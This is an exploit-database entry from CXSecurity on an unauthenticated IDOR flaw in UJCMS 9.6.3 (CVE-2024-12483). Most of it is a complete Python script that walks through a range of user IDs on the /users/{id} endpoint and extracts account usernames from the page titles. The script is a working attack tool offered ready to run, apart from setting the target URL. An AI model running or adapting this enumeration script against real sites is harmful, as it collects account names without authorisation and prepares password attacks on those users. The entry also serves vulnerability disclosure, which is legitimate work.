---
title: UJCMS 9.6.3 User Enumeration via IDOR
url: https://cxsecurity.com/issue/WLB-2025050052
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-05-30
fetch_date: 2025-10-06T22:24:13.634765
---

# UJCMS 9.6.3 User Enumeration via IDOR

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **UJCMS 9.6.3 User Enumeration via IDOR** **2025.05.29**  Credit:  **[Cyd Tseng](https://cxsecurity.com/author/Cyd%2BTseng/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2024-12483](https://cxsecurity.com/cveshow/CVE-2024-12483/ "Click to see CVE-2024-12483")**  CWE: **N/A** | |

# Exploit Title: UJCMS 9.6.3 User Enumeration via IDOR
# Exploit Author: Cyd Tseng
# Date: 11 Dec 2024
# Category: Web application
# Vendor Homepage: https://dromara.org/
# Software Link: https://github.com/dromara/ujcms
# Version: UJCMS 9.6.3
# Tested on: Linux
# CVE: CVE-2024-12483
# Advisory: https://github.com/cydtseng/Vulnerability-Research/blob/main/ujcms/IDOR-UsernameEnumeration.md
"""
An Insecure Direct Object Reference (IDOR) vulnerability was discovered in UJCMS version 9.6.3 that allows unauthenticated enumeration of usernames through the manipulation of the user id parameter in the /users/id endpoint. While the user IDs are generally large numbers (e.g., 69278363520885761), with the exception of the admin and anonymous account, unauthenticated attackers can still systematically discover usernames of existing accounts.
"""
import requests
from bs4 import BeautifulSoup
import time
import re
BASE\_URL = 'http://localhost:8080/users/{}' # Modify as necessary!
HEADERS = {
'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36',
'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8',
'Connection': 'keep-alive'
}
def fetch\_user\_data(user\_id):
url = BASE\_URL.format(user\_id)
try:
response = requests.get(url, headers=HEADERS)
if response.status\_code == 200:
soup = BeautifulSoup(response.content, 'html.parser')
title = soup.title.string.strip()
if title.lower() != '404':
username = re.sub(r' - UJCMS演示站$', '', title)
return user\_id, username
return None
except requests.RequestException as e:
print(f"Error fetching data for user ID {user\_id}: {e}")
return None
def user\_id\_generator(start, end):
for user\_id in range(start, end + 1):
yield user\_id
def enumerate\_users(start\_id, end\_id):
for user\_id in user\_id\_generator(start\_id, end\_id):
user\_data = fetch\_user\_data(user\_id)
if user\_data:
print(f"Valid user found: ID {user\_data[0]} with username '{user\_data[1]}'")
time.sleep(0.1)
if \_\_name\_\_ == '\_\_main\_\_':
start\_id = int(input("Enter the starting user ID: "))
end\_id = int(input("Enter the ending user ID: "))
print(f"Starting enumeration from ID {start\_id} to {end\_id}...")
enumerate\_users(start\_id, end\_id)

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025050052)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top